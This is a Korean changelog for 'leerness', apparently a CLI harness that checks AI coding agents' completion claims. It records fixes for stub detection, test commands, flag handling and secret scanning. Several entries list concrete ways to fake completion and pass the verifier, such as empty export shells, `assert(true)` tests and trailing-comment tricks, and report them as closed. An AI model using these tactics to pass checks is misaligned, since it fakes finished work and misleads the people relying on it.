- **설치 직후 REPL agent 모드 진입 문항 제거 (사용자 명시)**: REPL은 완성도가 올라가면 구현 예정 — 설치 흐름에서 질문·자동 진입 삭제(수동 `leerness agent`는 유지). 설치 문항이 한 개 줄어 더 단순.
- **운영**: leerness 영상(쇼츠) 생성 당분간 중지 — site release-pipeline의 렌더/검증/업로드 3단계에 `LEERNESS_VIDEO_ENABLED` 가드(레포 변수로 재개). 룰 R-0006(토큰 예산 고려)/R-0007(영상 중지) 등록.

### 기록만 (토큰 예산 고려 — 다음 라운드 후보, UR-0003 완전판)
- 렌즈 워크스페이스 커스텀(`.harness/quality-lenses.json` — 프로젝트별 질문 추가/수정), handoff 헤드라인에 in-progress task 키워드 → 관련 렌즈 자동 힌트, verify-claim/session close에 렌즈 자가답변 기록(advisory), MCP `leerness_lens` 노출, 인과관계 그래프 자동 추론(변경 파일 확장자 → 영향 분야 매핑).

### 검증 (회귀 0)
- **selftest 227→229** (카탈로그 무결성·사용자 원문·affects 상호참조 행위 + 표면 등재/REPL 제거 소스 가드 — 자기참조 함정 1건 즉시 수정) · **E2E 365/365** · lens 행위 확인(유효/무효 도메인 exit 0/1).
- patch(1.18.3) — npm 미배포(R-0011, GitHub/CHANGELOG 누적).

## 1.18.2 — 2026-06-11 — 위장 스텁(빈 export 껍데기) 차단 — 거짓완료 우회 폐쇄 + 적대 강화

**🛡️ "거짓완료 차단"의 위장 스텁 우회 폐쇄 — 적대 워크플로로 강화.** 1.18.1 재실증에서 정직한 한계로 남겼던 위장 스텁을 닫고, 적대 헌터(우회·오탐 병렬)로 1차 수정의 우회를 재발견해 함께 폐쇄. `module.exports = {};` 한 줄 "빈 껍데기 구현"이 `verify-claim` "구현 실체 ✓"를 통과하고 `require` 만 하는 가짜 테스트와 결합하면 **`--strict-claims` 에서도 exit 0** 으로 통과하던 우회(맹신 X 클린룸 케이스 B).

### 변경 (재실증 후속 + 적대 강화)
- **빈 export 껍데기 = 스텁 판정**: 비주석 코드가 빈 값(zero-logic) producer 뿐이면 스텁 → done 주장 기본 게이팅 FAIL. 순수 함수 `_vcImplIsEmpty` 분리(단위 테스트). 적대 헌터가 찾은 우회형까지 포함: `{}`·`[]`·`Object.freeze({})`·`new Object()`·`(async) function(){}`·`(async)()=>{}`·`()=>({})`·`class {}`·`export default {}`·`export {}`·`exports.default = {}`·`pass`, TS 캐스트(`{} as any`) 허용.
- **인라인 주석 우회 차단**: 같은 줄 트레일링 주석(`module.exports = {}; // ...`)이 앵커를 깨던 가장 사소한 누수 — 줄별 인라인 `//` 제거(따옴표 없는 줄 한정, 문자열 보호) 후 판정.
- **확장자 정합(`FILE_EXTS`)**: `java`·`php`·`mjs`·`cjs` 추가 — 이전엔 `.java`/`.php` 임플 주장이 추출조차 안 돼 스텁/존재 검사를 무검사 통과하던 불일치 버그 해소.
- **과탐 0(오탐 헌터 ~45 합법패턴 확인)**: 이름붙은 export(`{ a, b }`)·재노출(`require('./x')`/`export * from`)·멤버 객체(`{ port: 3000 }`)·`Object.freeze({a:1})`·메서드 있는 클래스·비어있지 않은 화살표(`(a,b)=>a+b`)·`class Foo {}` + 별도 export(스펙 FP-가드)는 전부 정상 통과.
- 참고: 재실증이 의심했던 "테스트-구현 연결 OR 우회"는 **실재하지 않음**(내용 기반 검사가 미연결 테스트를 정확히 잡음 — 클린룸 케이스 A strict=exit 1).
- 정직한 잔여(백로그): 호출식 다중 인자(`Object.assign({},{})`), Python def/class-wrapped `pass`·`...`·`raise NotImplementedError`, 다언어(Ruby/Go/Rust `todo!()`) 빈 본문 — 정규식 누적보다 경량 토큰/AST 기반 "빈 컨테이너" 재설계로 미룸.

### 검증 (회귀 0)
- **selftest 225→227** (빈 껍데기 기본+우회형 8종+정상 10종 행위 단위 + 소스/확장자 가드) · **E2E 365/365** · **적대 워크플로 2회**(우회 9건 isReal 재현 → 수정 → CLI 행위 14/14 재확인; 오탐 0).
- **행위 재현(맹신 X)**: Object.freeze/new Object/async fn/exports.default/=>({})/class{}/인라인주석/리터럴 8종 → strict exit 1(이전 0); 진짜 구현·배럴·freeze({a:1})·메서드 클래스·설정 객체 6종 → exit 0(오탐 0).
- patch(1.18.2) — npm 미배포(R-0011, GitHub/CHANGELOG 누적).

## 1.18.1 — 2026-06-11 — 재실증 후속: --test-cmd 비-JS 거짓차단 해소 (P1) + 정합 구멍 2건

**🔁 1.18.0 을 게시본에서 다시 검증(맹신 X)했더니, "범용" 약속의 핵심인 비-JS 사용자에게 새 P1 이 보였다.** 독립 클린룸 3곳(파이썬 재개발·적대 재공격·Node 회귀)으로 1.18.0 의 5격차를 재실증한 결과 4건은 닫혔으나, `verify-claim --run-tests --test-cmd "python ..."` 이 권한 차단(126)으로 막혀 **초록 프로젝트에 거짓 "✗ 불일치 FAIL"**(exit 1)을 내던 것을 발견·수정.

### 변경 (재실증 발견)
- **🌐 --test-cmd 비-JS 인터프리터 거짓차단 해소 (P1)**: `leerness init` 기본 권한(basic, `shell.exec=false`)의 allowList 가 JS 도구(git/npm/node…)만 허용해 `python/py/pytest/uv` 등이 status 126 으로 막히고, 그게 "테스트 실패→주장 불일치" 거짓 판정으로 둔갑했음. 이제 **사용자가 명시한 `--test-cmd`/설정 `testCommand` 는 명시 권한(userAuthorized)** 으로 인터프리터 실행 허용(cwd jail 은 유지). 추가 방어: 권한/jail 로 막힌 실행은 **"테스트 실패"가 아니라 "측정 불가(skip, 불일치 판정 아님)"** 로 처리 — 차단이 절대 거짓 FAIL 로 바뀌지 않음.
- **🔚 task update 위치인자 status 무시 차단 (P2)**: `task update T-0003 done` 처럼 상태를 위치인자로 주면 조용히 무시되고 "✓ updated"가 출력돼 **done 이 안 되고 verify-claim/마감 정직성 검사가 통째로 건너뛰던** 데이터 정합 구멍 해소 — id 뒤 떠도는 positional 거부 + did-you-mean(`--status done`). 정상 `--status`/`--next` 는 과탐 0.
- **🏷 종합 라벨 정직화 (P3)**: 커스텀 `--test-cmd` 인데도 종합 줄이 "npm test 실행"으로 하드코딩되던 것 → 실제 실행 명령 표기.

### 검증 (회귀 0)
- **selftest 222→225** (권한 결정 `_isCommandPermitted` 행위 단위 + 정합 가드) · **E2E 365/365** (대기 중 갱신).
- **행위 재현(맹신 X)**: 초록 파이썬 프로젝트에서 `verify-claim --run-tests --test-cmd "python test_todo.py"` → exit 0 + "python test_todo.py 실행: ✓ all passed" + 일치 판정(이전: 126/거짓 FAIL/exit 1). `task update T-0001 done` → 명확 에러+exit 1, status 는 그대로(done 아님), `--status done`/`--next` 정상.
- patch(1.18.1) — npm 미배포(R-0011, GitHub/CHANGELOG 누적). 다음 minor 때 묶음 공개.

## 1.18.0 — 2026-06-10 — 🛡️ [안정화/Stable] 범용 검증 하네스 안정 minor

**🛡️ 안정화(Stable) minor — "범용 AI 코딩 하네스" 실증 격차 전부 해소.** 5개 독립 클린룸 실사용 평가(Python/Node/Rust 실개발·에이전트 교대·적대 공격)가 찾은 P1 2건 + P2 3건(1.17.2~1.17.6)을 검증·통합해 npm 공개. R-0011 정책의 9번째 minor. 새 포지셔닝: **"어떤 언어, 어떤 AI 에이전트로 작업하든 — 증거 없이는 끝났다고 말할 수 없게."**

### 이번 minor 통합 (1.17.1~1.17.6)
- **🌐 테스트 명령 해석 체인 (P1)**: `verify-claim --run-tests` 가 npm test 하드코딩 → `--test-cmd` > 설정 `testCommand` > 실제 npm test(placeholder 제외) > skip. 파이썬 프로젝트 오판 해소 + pytest 출력 파싱.
- **🛡️ 빈껍데기·가짜 테스트 차단 (P1)**: 주석뿐 구현(비주석 코드 0줄) done 게이팅 FAIL + 테스트-구현 연결 검사(12개 언어, 파이썬 `#` 스텁 포함). `--json implementationSubstance/testImplLink`.
- **🧪 테스트 카운트 정직화 (P2)**: pytest·루트 `*.test.*` 관례 인식 + 측정불가="검증 미수행"(통과 위장 금지) + 한국어 "테스트 N개" 주장 추출(부풀린 주장 차단).
- **🔗 unknown flag 거부 (P2)**: `task update --next-action` 같은 미존재 옵션이 값을 조용히 버리던 것 → 거부 + did-you-mean(인수인계 유실 차단).
- **🔚 마감 정합 (P2)**: session close 가 done 낙관 의심·살아있는 시크릿을 재확인해 표면화 — 마감이 마지막 관문 역할.
- **plan add 공백제목 손상 수정** + milestone 파서 개행 미흡수(1.17.1).

### 검증 (회귀 0)
- **selftest 222 PASS** · **E2E 365/365 PASS** · npm gate=minor_bump. 각 격차 행위 재현(공격 차단 + 정직 작업 과탐 0) 완료.

### 안정화 표시 (R-0006)
CHANGELOG [안정화/Stable] · git tag (Stable) · GitHub release (Stable) · npm dist-tag `stable` 시도.

## 1.17.6 — 2026-06-10 — 범용성⑤(P2 완결): session close 마감 정합 (UR-0049)

**🔚 마감이 "마지막 관문" 역할을 하도록.** 5축 실증에서 — verify-claim 이 거짓으로 판정했던 task 가 마감 보고서에 평범한 "done"으로, gate 가 시크릿으로 실패 중인데 "clean (sleep 안전)"으로 선언되던 정합 문제 해소. **이로써 5축 격차(P1 2건 + P2 3건) 전부 닫힘.**

### 변경 (UR-0049)
- **done 낙관 재확인**: 마감 시 done task 들의 evidence 를 코드 흔적과 재대조(`_detectOptimism`) — verify-claim 을 건너뛴 거짓 주장(예: "DB 저장 구현" 인데 코드에 DB 호출 없음)을 `⚠ 낙관 의심 미해소` 로 표면화. `--json completionHonesty.optimismUnresolved`.
- **마감 보안 재확인**: 커밋 대상 시크릿이 살아있으면 `🚨 마감 보안: N건 미해소 — clean 아님` 표면화. `--json closeSecurity.committedSecrets`.
- advisory(차단 X) — 마감 흐름은 유지하되 거짓/위험이 조용히 통과하지 않음.

### 검증 (회귀 0)
- **selftest 221→222** · **E2E 365/365** · 행위 3종: 거짓 DB 주장 done + 시크릿 → 두 경고 표면화 ✓ · --json 필드 ✓ · 진짜 구현+시크릿 제거 → 경고 0(과탐 0) ✓.
- patch(1.17.6) — npm 미배포(R-0011, GitHub). **다음: 1.18.0 [Stable] "범용 검증 하네스" minor(1.17.1~1.17.6 묶음 공개).**

## 1.17.5 — 2026-06-10 — 범용성④: 모르는 옵션 조용히 무시 차단 (UR-0048)

**🔗 인수인계 유실의 최악 양식 차단.** 5축 실증에서 — `task update --next-action "..."` 처럼 존재하지 않는 옵션을 줘도 "✓ task updated"만 출력하고 값을 버려, **쓴 에이전트는 기록됐다고 믿고 다음 에이전트는 placeholder 를 받던** P2 해소.

### 변경 (UR-0048)
- **`task update` unknown flag 거부**: 지원 외 `--플래그` 발견 시 exit 1 + **did-you-mean**(`--next-action` → "혹시 `--next`?") + 지원 플래그/사용법 안내. `--json` 은 `{code:'unknown_flag'}` 구조화.
- 전역 플래그(`--path/--json/--force/--lenient`)는 항상 허용 — 과탐 0. 재사용 가능한 `_rejectUnknownFlags` 헬퍼(다른 쓰기 명령 확대 여지).

### 검증 (회귀 0)
- **selftest 220→221** · **E2E 365/365** · 행위 4종: `--next-action` 거부+제안 ✓ · `--json` 구조화 ✓ · 올바른 `--next` 정상 저장 ✓ · 전역 플래그 통과 ✓.
- patch(1.17.5) — npm 미배포(R-0011, GitHub). 잔여: UR-0049(마감 정합) → 완료 시 1.18.0 "범용 검증" minor.

## 1.17.4 — 2026-06-10 — 범용성③: 테스트 카운트 "측정실패=통과" 역전 해소 (UR-0047)

**🧪 5개 클린룸 리포트가 공통 지적한 P2.** "실측: 테스트 파일 못 찾음"이라면서 바로 아래 "✓ pass (실측 ≥ 주장)"로 통과시키던 모순 — 부풀린 테스트 주장("cargo test 12개", "테스트 50개")이 검증을 헛통과하던 것 해소.

### 변경 (UR-0047)
- **관례 확대**: 주장된 테스트 파일 우선 합산 + 글롭(pytest `test_*.py`·`*_test.py` / 루트·tests/ 의 `*.test.*`·`*.spec.*`) — 이전엔 `tests/test.js` 등 3개 하드코딩. 파이썬은 `def test_` 개수로 카운트.
- **측정불가 = 검증 미수행**: 테스트 파일을 못 찾으면 "⊘ 측정 불가 — 주장 N개 검증 미수행 (pass 아님)" 정직 표기 + verdict `testCountMatch: null`(게이팅 미기여 — false 만 FAIL).
- **🐛 주장 추출 보강(맹신 X 행위검증 중 발견)**: "테스트 50개"(한국어 자연어순)를 못 잡아 **부풀린 주장이 카운트 검증을 아예 안 탔음** → `테스트 N개` 패턴 추가.

### 검증 (회귀 0)
- **selftest 219→220** · **E2E 365/365** · 행위 4종: pytest 실측(2개) ✓ · **부풀린 "테스트 50개"(실측 2) exit 1 차단**(이전 헛통과) · 측정불가 정직 표기 ✓ · 루트 `*.test.js` 인식(실측 3) ✓ · 정직 주장 exit 0(과탐 0).
- patch(1.17.4) — npm 미배포(R-0011, GitHub). 잔여: UR-0048(unknown flag)·UR-0049(마감 정합).

## 1.17.3 — 2026-06-10 — 범용성②: 빈껍데기 구현·가짜 테스트 차단 (UR-0046)

**🛡️ 간판 기능 "거짓완료 차단"의 상한선 끌어올리기.** 5축 실증 분석의 Attack C — 주석뿐인 구현 파일 + 아무것도 검사하지 않는 `assert(true)` 테스트가 `verify-claim` 을 **exit 0 으로 완전 통과**하던 P1 — 을 차단.

### 변경 (UR-0046)
- **구현 실체(스텁) 검사**: 주장된 구현 파일(테스트 제외, js/ts/py/go/rs 등 12종 확장자)의 **비주석 코드줄이 0** 이면 done 게이팅 FAIL — "주석/TODO 뿐인 빈껍데기"를 확실 신호만으로 차단(과탐 0).
- **테스트-구현 연결 검사**: 구현+테스트가 함께 주장됐는데 어떤 테스트도 구현 파일명을 참조하지 않으면 "빈 테스트 의심" advisory ⚠ (`--strict-claims` 시 FAIL).
- `--json` verdict 에 `implementationSubstance` / `testImplLink` + `stubFiles` 노출(머신 경로 동일 게이팅).

### 검증 (회귀 0)
- **selftest 218→219** · **E2E 365/365** · Attack C 재현: 스텁+가짜테스트 **exit 0→1 차단** · 진짜 구현 exit 0(과탐 0) · **파이썬 스텁(#주석뿐)도 차단**(언어중립) · --json verdict 노출.
- patch(1.17.3) — npm 미배포(R-0011, GitHub). 잔여 격차: UR-0047(테스트카운트 역전)·0048(unknown flag)·0049(마감 정합).

## 1.17.2 — 2026-06-10 — 범용성①: verify-claim 테스트 명령 해석 체인 (UR-0045)

**🌐 "범용 AI 코딩 하네스" 5축 실증 분석의 P1 1호 해소.** `verify-claim --run-tests` 가 `npm test` 하드코딩이라 — 테스트가 전부 통과한 파이썬 프로젝트(npm init 잔재 placeholder 존재)를 "주장 불일치 FAIL"로 오판하던 범용성 정면 반례를 수정.

### 변경 (UR-0045)
- **테스트 명령 해석 체인**: `--test-cmd "<명령>"` > `.harness/leerness-config.json` 의 `"testCommand"` > package.json 의 **실제** test 스크립트(npm placeholder "no test specified" 는 테스트가 아니므로 제외) > **skip 표기**(불일치 판정 금지).
- **pytest 출력 파싱**: "N passed in …s" 형식 인식(파이썬 러너 pass/fail 비율 표시).
- 신규 value-flag `--test-cmd` 를 `nonFlagArgs` withValue 에 등록(1.14.2 교훈 적용 — 제목 흡수 차단).

### 검증 (회귀 0)
- **selftest 217→218** · **E2E 365/365** · 행위 재현: ① placeholder-only 파이썬 프로젝트 `--run-tests` → skip + exit 0(오판 해소, 이전 exit 1) ② `--test-cmd "node mytest.js"` → 실행+파싱(2/2 passed)+주장 대조 ✓ ③ config testCommand 경유 동작 ④ 실제 npm test 스크립트는 기존대로 ⑤ 실패 명령은 정직하게 exit 1.
- patch(1.17.2) — npm 미배포(R-0011, GitHub). 다음: UR-0046(스텁/연결 검사 — 빈껍데기 구현 차단).

## 1.17.1 — 2026-06-09 — 17번째 버그헌트: plan add 공백제목 데이터 손상 차단

**🔬 17번째 버그헌트(이번 세션 신규코드 회귀 + 광역 스윕).** 신규코드(gate --json stdout-swap·memory --json·_GROUP_USAGE·scan break·_cellSafe)는 **0 결함**(5000키 664ms 등 입증). plan add 입력검증 1건 발견·수정.

### 수정 (재현 검증)
- **🟠 plan add 공백 제목 → plan.md 손상 (P2)**: `plan add "   "`(공백만)이 `|| 기본값`을 우회(truthy)해 빈 제목으로 기록 → milestone 파서의 `\s*` 가 개행을 흡수해 **다음 줄 `Status: planned` 를 제목으로 오인**. 2중 수정: ① dispatch 에서 `.trim()` 후 판정(공백→기본값 '새 계획'), ② 파서 `\.\s*` → `\.[ \t]*`(개행 미흡수, 5곳 + pure-utils) — 손상 클래스 차단.

### 검증 (회귀 0)
- **selftest 216→217** · **E2E 365/365** · `plan add "   "` → '새 계획'(손상 없음)·정상 제목 보존 행위 재현.
- patch(1.17.1) — npm 미배포(R-0011, GitHub). (P3 plan add 빈-인자 기본값은 의도된 동작 — trim 으로 안전화.)

## 1.17.0 — 2026-06-09 — 🛡️ [안정화/Stable] 외부 클린룸 일관성 안정 minor

**🛡️ 안정화(Stable) minor.** 외부 클린룸 리뷰(게시본 무README 신규사용자 관점)에서 도출한 --json·CLI 일관성 개선(1.16.1~1.16.2)을 검증·통합해 npm 공개. R-0011 정책의 8번째 minor. 영상은 HyperFrames "문제→해소" 디자인.

### 이번 minor 통합 (1.16.1~1.16.2)
- **gate `--json` 단일 객체화**: 텍스트+단계JSON 혼재로 파싱 불가하던 것 → `{ok,total,failed,checks}` 단일 JSON(CI/에이전트 소비 가능).
- **memory search `--json`**: 플래그 무시하던 것 → `{query,total,results}` 구조화.
- **명령그룹 무인자 일관화**: `rule`/`skill`/`feature`/`memory` 를 하위명령 없이 부르면 "알 수 없는 명령" 대신 **사용법 힌트**(decision/lesson 과 일관, `--json` 구조화).
- **문서 정합**: `about` 의 메모리 경로 `.leerness/` → `.harness/`(기본 워크스페이스) 정정.

### 검증 (회귀 0)
- **selftest 216 PASS** · **E2E 365/365 PASS** · npm gate=minor_bump. gate/memory --json valid JSON + bare-group 사용법 힌트 행위 재현. (맹신 X: scan --json exit·AKIA 는 비-버그로 판정해 제외.)

### 안정화 표시 (R-0006)
CHANGELOG [안정화/Stable] · git tag (Stable) · GitHub release (Stable) · npm dist-tag `stable` 시도.

## 1.16.2 — 2026-06-09 — CLI 일관성: 명령그룹 무인자 → 사용법 힌트 (외부클린룸 UR-0042)

**🧭 명령그룹을 하위명령 없이 부르면 친절한 사용법 안내.** 외부 클린룸 리뷰가 지적: `rule`/`skill`/`feature`/`memory` 를 하위명령 없이 부르면 "알 수 없는 명령"(유효 그룹인데 혼란)이 떴음 — `decision`/`lesson` 처럼 사용법 힌트로 통일.

### 변경 (UR-0042)
- bare `rule`/`skill`/`feature`/`memory` → `subcommand_required` + 실제 하위명령 사용법 표시(예: `memory search "<키>" | memory status | …`). `--json` 도 구조화 출력.
- 기존 동작 보존: 하위명령이 있는 호출(`memory search` 등)은 그대로.

### 검증 (회귀 0)
- **selftest 215→216** · **E2E 365/365** · 4개 그룹 bare 호출 → 사용법 힌트, `memory --json` → `{code:'subcommand_required'}` 행위 재현.
- patch(1.16.2) — npm 미배포(R-0011, GitHub). 잔여: bare `leerness` 자동 init·hook(UR-0041, 설계 재검토), `--language en` 런타임(UR-0042 잔여).

## 1.16.1 — 2026-06-09 — 외부 클린룸 리뷰: --json 일관성 + 문서 정합

**🔬 외부 클린룸 리뷰(게시본 1.16.0 설치·README/소스 미참조·신규 사용자 관점, 2모델).** 발굴된 지적을 직접 재현해 진짜만 수정(맹신 X — 비-버그/의도된 동작은 제외).

### 수정 (전부 재현 검증)
- **gate `--json` 단일 객체화 (C2)**: 이전엔 텍스트 헤더 + 단계별 JSON 이 섞여 파싱 불가. 이제 `{ok, total, failed, checks:[{name,ok}]}` 단일 객체(하위 출력 억제). CI/에이전트 소비 가능.
- **memory search `--json` (C3)**: `--json` 을 무시하고 텍스트만 내던 것 → `{query, total, results:[{file,line,text}]}` 구조화(전 명령 일관).
- **about 문서 정합 (C4)**: `about` 의 메모리 설명이 `.leerness/` 라 했으나 기본 워크스페이스는 `.harness/` → 정정(선택 state substrate 만 .leerness/).

### 비-버그 판정 (맹신 X — 재현했으나 수정 안 함)
- **scan secrets `--json` exit 코드**: 리뷰는 exit 0 라 했으나 재현 결과 committed 발견 시 exit 1 정상(코드도 `if(committed.length) process.exitCode=1`). gitignored-only(안전) → exit 0 은 의도된 동작.
- **AWS AKIA 미탐지**: `...EXAMPLE` 포함은 placeholder 가드로 스킵(의도) — 실 키(EXAMPLE 없음)는 정상 탐지.

### 잔여(백로그): bare `leerness`(무인자) 자동 init·hook / `--language en` 런타임 미적용 / 서브명령그룹 무인자 동작 일관화.

### 검증 (회귀 0)
- **selftest 214→215** · **E2E 365/365** · gate/memory --json valid JSON + about .harness 행위 재현.
- patch(1.16.1) — npm 미배포(R-0011, GitHub).

## 1.16.0 — 2026-06-09 — 🛡️ [안정화/Stable] 16번째 버그헌트 안정 minor

**🛡️ 안정화(Stable) minor.** 16번째 멀티에이전트 버그헌트(8건 발굴·전부 직접 재현)의 코어 수정(1.15.1)을 검증·통합해 npm 공개. R-0011 정책의 7번째 minor. **이 릴리스 영상부터 개선된 "문제→해소" 디자인**(짧은 인트로 + 이전/이제 모션 + 의미 보존 하이라이트)으로 제작됩니다.

### 이번 minor 통합 (1.15.1 — 전부 재현 검증)
- **🔴 시크릿 스캐너 FN 차단**: 한 파일에 같은 패턴 시크릿이 2개 이상이면 첫 번째만 보고하고 나머지를 놓치던 문제(루프 break) 수정 → 모두 탐지.
- **🟠 task/rule list 표 정렬**: 제목에 파이프(`|`)가 있으면 마크다운 표 칼럼이 깨지던 표시 버그 → `_cellSafe` 적용.
- **📖 문서 정합**: `encoding check` 도움말이 실제 미검사 항목(CRLF)을 광고하던 것 정정.
- (사이트 영상 파이프라인 4버그 — 큐 키/빈 제목/빈 WAV 통과/check-only 부작용 — 도 동시 수정.)

### 검증 (회귀 0)
- **selftest 214 PASS** · **E2E 365/365 PASS** · npm gate=minor_bump. 시크릿 멀티매치·표 파이프·도움말 정합 행위 재현.

### 안정화 표시 (R-0006)
CHANGELOG [안정화/Stable] · git tag annotation (Stable) · GitHub release (Stable) · npm dist-tag `stable` 시도.

## 1.15.1 — 2026-06-09 — 16번째 버그헌트: 시크릿 스캐너 FN + 표 파이프 + 문서정합

**🔬 멀티에이전트 버그헌트(신규코드 0건·코어 4건·사이트 4건 발굴) → 8건 전부 직접 재현 후 진짜만 수정.** 맹신 X: 각 지적을 temp 에서 직접 재현하고, 의도된 동작은 수정 제외.

### 수정 (코어 3건 — 전부 재현 검증)
- **🔴 시크릿 스캐너 FN (F1)**: 한 파일에 같은 패턴의 시크릿이 2개 이상(예: `secret:` 와 `api_key:` 둘 다 'Hardcoded password' 패턴)이면 **첫 번째만 잡고 나머지 누락**(루프 `break`). break 제거 + zero-width 가드 → 모두 탐지.
- **🟠 task/rule list 표 깨짐 (F2)**: 항목 제목에 파이프(`|`)가 있으면 마크다운 표 칼럼이 어긋남(저장은 안전했으나 list **표시**가 raw). 표시도 `_cellSafe` 적용(`\|`).
- **문서정합 (F3)**: `encoding check` 도움말이 'CRLF 검사'를 광고했으나 실제 미검사(정책은 BOM/NUL/.bat/roundtrip). 도움말을 실제 동작과 일치하게 정정.

### 의도된 동작(수정 안 함 — 맹신 X)
- `status --json` 가 `healthy:false` 여도 exit 0: **설계상 정보성 명령**(`scope:'install'` + `healthyMeaning` 명시, 게이트는 `verify`/`gate`). 버그 아님.

### 검증 (회귀 0)
- **selftest 213→214** · **E2E 365/365** · F1(2건 탐지)·F2(파이프 `\|` 이스케이프)·F3(help CRLF 제거) 행위 재현. (사이트 파이프라인 4건은 leerness-site 에서 별도 수정.)
- patch(1.15.1) — npm 미배포(R-0011, GitHub).

## 1.15.0 — 2026-06-09 — 🛡️ [안정화/Stable] Karpathy 가이드라인 정렬 3부작 안정 minor

**🛡️ 안정화(Stable) minor.** Andrej Karpathy 코딩 가이드라인(생각하고 코딩 / 단순성 / 외과적 변경 / 목표 주도) 대비 외부 에이전트 검토에서 도출한 정렬 작업(1.14.1~1.14.3)을 검증·통합해 npm 공개. R-0011 정책의 6번째 minor. 영상은 HyperFrames 파이프라인 제작.

### 이번 minor 통합 (1.14.1~1.14.3) — Karpathy 4원칙 정렬
- **원칙1·2 (생각하고 코딩 / 단순성)**: `review-request` 가 요청의 **범위 과대 신호**(전체·모두·리팩토링·재구성·rewrite/refactor everything)와 **투기적 신호**(나중에·확장 가능·유연하게·범용화·추상화·future-proof)를 탐지해 "더 작게 쪼갤 수 있나? 요청 범위만" 환기(advisory). `--json simplicitySignals`.
- **원칙4 (목표 주도 — 검증가능한 완료)**: `plan add --done-when "<조건>"` 로 milestone 에 성공 기준을 1급 필드(`Done-When`)로 저장 · `plan list` 표시 + `--json doneWhen` · 미정 시 환기. (부수: `--done-when` 값이 제목에 흡수되던 잠복 버그 수정.)
- **원칙2 (자기적용)**: 정적 분석으로 호출 0·동적참조 0 인 **죽은 함수 5개 제거**(무행위변경). 함수 476→471.

### 검증 (회귀 0)
- **selftest 213 PASS** · **E2E 365/365 PASS** · npm gate=minor_bump. 각 기능 행위 재현(신호 탐지/오탐0, done-when 저장·표시, dead 제거 후 재스캔 0).

### 안정화 표시 (R-0006)
CHANGELOG [안정화/Stable] · git tag annotation (Stable) · GitHub release (Stable) · npm dist-tag `stable` 시도.

## 1.14.3 — 2026-06-09 — Karpathy 정렬④(완결): 자체 단순화 — 죽은 코드 제거 (원칙2)

**🧹 leerness 가 자신의 원칙2(단순성)를 자신에게 적용.** 정적 분석으로 "정의됐으나 호출 0 + 동적(문자열) 참조 0" 인 함수만 골라 제거 — 무행위변경(검증가능) 단순화.

### 변경 (UR-0033)
- **죽은 함수 5개 제거**: `_isAutoLoopActive` · `_invalidateSkillsCache` · `_currentLang` · `_typewrite` · `_writeDomainCatalog` (전부 호출처 0, 과거 리팩토링/대체로 고립된 잔재). 함수 476→471, bin 19561줄.
- 제거 후 **재스캔 = 새 고아 0** (각 함수가 쓰던 헬퍼는 다른 곳에서도 사용 중 — 연쇄 dead 없음).
- 막연한 "큰 파일 줄이기"가 아닌, **검증가능·무행위변경** 범위로 한정(Karpathy 원칙3 외과적 변경 준수).

### 검증 (회귀 0)
- **selftest 213 PASS** · **E2E 365/365 PASS** (행위 동일 — dead 코드라 출력/동작 불변). 제거 전 각 후보의 전체 참조(bin+lib+scripts+test)=정의 1줄만 직접 확인(맹신 X).
- patch(1.14.3) — npm 미배포(R-0011, GitHub). **Karpathy 백로그(UR-0031/0032/0033) 완결.**

## 1.14.2 — 2026-06-09 — Karpathy 정렬③: plan --done-when 검증가능 완료조건 (원칙4)

**🎯 milestone 에 "성공 기준"을 1급 필드로.** Karpathy 원칙4(목표 주도 실행 — 검증가능한 완료 정의)의 빠진 절반. plan 에 done-criteria 개념이 없어 "언제 끝인지" 가 모호했던 것을 보강.

### 변경 (UR-0032)
- **plan add `--done-when "<조건>"`**: milestone 에 `Done-When:` 라인으로 검증가능 완료조건 저장. 미지정 시 `(미정)`.
- **plan list 표시 + `--json doneWhen`**: 각 milestone 의 완료기준 노출. 누락(legacy/미정) 시 `⚠ 미정 — --done-when 권장 (Karpathy 원칙4)` 환기.
- **🐛 잠복 버그 수정(맹신 X)**: `nonFlagArgs()` 의 value-flag 집합(`withValue`)에 `--done-when` 이 없어, 값이 positional 로 누출돼 **milestone 제목에 흡수**(예: "결제 연동" → "결제 연동 Stripe e2e…")되던 것 차단. 행위 재현으로 발견·수정.

### 검증 (회귀 0)
- **selftest 212→213**, 행위: `plan add "결제 연동" --done-when "Stripe e2e 통과"` → 제목="결제 연동"(흡수 없음)·Done-When 분리 저장·plan list/json 노출; 미지정 → (미정)+환기.
- patch(1.14.2) — npm 미배포(R-0011, GitHub). 잔여 Karpathy: UR-0033(자체 단순화).

## 1.14.1 — 2026-06-09 — Karpathy 정렬②: review-request 범위과대/투기적 신호 (원칙1+2)

**🤔 사전 검토 게이트에 "생각하고 코딩" + "단순성 우선" 신호 추가.** Karpathy 리뷰가 가장 약한 원칙으로 꼽은 1(트레이드오프 표면화)·2(단순성)를, 가장 많이 쓰는 `review-request`(작업 전 자동 호출)에서 보강.

### 변경 (UR-0031)
- **review-request 단순성/범위 신호**: 요청 텍스트에서 **범위 과대 동사**(전체·모두·리팩토링·재구성·rewrite/refactor everything 등)와 **투기적 신호**(나중에·확장 가능·유연하게·범용화·추상화·future-proof 등)를 탐지해 `efficiencyHints` + `--json simplicitySignals` 로 표면화. "더 작게 쪼갤 수 있나? 요청 범위만" 환기. advisory(차단 X — 표면화만, Karpathy 원칙1).
- 신규 명령 0 — 기존 명령 확장(leerness 자신의 원칙2 준수).

### 검증 (회귀 0)
- **selftest 211→212**, 행위 재현: "전체 코드베이스 리팩토링 + 나중에 유연하게 확장 가능하게 추상화" → broad=[전체,리팩토링] spec=[나중에,유연하게,확장 가능,추상화]; 단순 요청 → 0(오탐 없음).
- patch(1.14.1) — R-0011 정책상 npm 미배포(GitHub). 잔여 Karpathy 백로그: UR-0032(plan --done-when 성공기준), UR-0033(자체 단순화).

## 1.14.0 — 2026-06-09 — 🛡️ [안정화/Stable] 블라인드 리뷰 수정 + Karpathy 정렬 안정 minor

**🛡️ 안정화(Stable) minor.** 블라인드 3-모델 리뷰(codex/Sonnet/Opus) 수정 + Karpathy 가이드라인 정렬(1.13.1~1.13.2)을 검증·통합해 npm 공개. R-0011 정책의 5번째 minor. (이 릴리스의 소개 영상부터 **HyperFrames 파이프라인**으로 자동 제작됩니다.)

### 이번 minor 통합 (1.13.1~1.13.2)
- **🔴 memory search 5종 표면 복구** (블라인드 Sonnet P1): `memory search` 가 lessons.md/rules.md 를 누락해 저장한 교훈·룰을 못 찾던 문제 → 추가.
- **🔴 옵션-only 무명령의 묵시적 init 쓰기 차단** (블라인드 codex P1): `leerness --json` 처럼 명령 없이 옵션만 주면 cwd 에 `.harness` 가 생성되던 부작용 → help 처리(명시 init 만 쓰기).
